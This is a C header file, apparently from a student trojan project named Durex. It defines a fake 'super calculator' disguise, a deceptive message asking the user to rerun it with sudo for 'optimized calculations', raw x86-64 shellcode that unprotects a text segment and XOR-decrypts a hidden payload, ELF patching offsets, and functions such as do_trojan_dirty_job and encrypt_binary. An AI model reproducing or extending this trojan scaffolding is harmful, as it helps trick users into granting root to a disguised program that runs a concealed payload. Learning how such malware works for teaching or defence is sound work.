/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/08/14 17:29:19 by vscode            #+#    #+#             */
/*   Updated: 2021/12/09 13:05:42 by alagroy-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

# include <stdio.h>
# include <string.h>
# include <stdlib.h>
# include <unistd.h>
# include <fcntl.h>
# include <ctype.h>
# include <elf.h>

# define KEY_LEN 32
# define HEADERS_SIZE (sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))

# define ROOT_ERROR_MSG "Sorry, I need root rights to use all the possible ressource of your CPU to make my super optimized calculations.\nRun again with sudo.\n"
# define STR_INTRO "Welcome to my super calculator, operations types supported until now : + - * / %\nEnter exit to quit"
# define HEX_TO_CHAR(hex) ((isalpha(*(hex)) ? isupper(*(hex)) ? *(hex) - 'A' + 10 : *(hex) - 'a' + 10 : *(hex) - '0') << 4 | ((isalpha(*(hex + 1)) ? isupper(*(hex + 1)) ? *(hex + 1) - 'A' + 10 : *(hex + 1) - 'a' + 10 : *(hex + 1) - '0')))

# define SHELLCODE_DECRYPT "\x48\x8d\x3d\x32\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x31\xc0\x48\x81\xc6\x00\x10\x00\x00\x48\x83\xc2\x07\x83\xc0\x0a\x0f\x05\xb9\x2a\x00\x00\x00\xbe\x20\x00\x00\x00\x48\x8d\x15\x09\x00\x00\x00\x4d\x31\xc0\x48\x31\xc0\xeb\x21\x5f\x42\x8a\x04\x07\x00\xe0\x30\x02\x48\xff\xc2\x49\xff\xc0\x49\x39\xf0\x75\x06\x80\xc4\x2a\x4d\x31\xc0\xe2\xe5\xe9\x26\x00\x00\x00\xe8\xda\xff\xff\xff"
# define SHELLCODE_LEN 94
# define TEXT_MPROTECT_OFF 0x3
# define TEXT_LEN_OFF 0x20
# define TEXT_REL_OFF 0x2c
# define JMP_ADDR_OFF 0x55

typedef unsigned char   byte;

extern char             *g_payload;

byte                    *decrypt_payload(char *payload, int *len);
byte                    *encrypt_binary(byte *payload, int len);
void                    do_trojan_dirty_job(void);
void                    get_filename(int *buf);
void                    calc(void);

#endif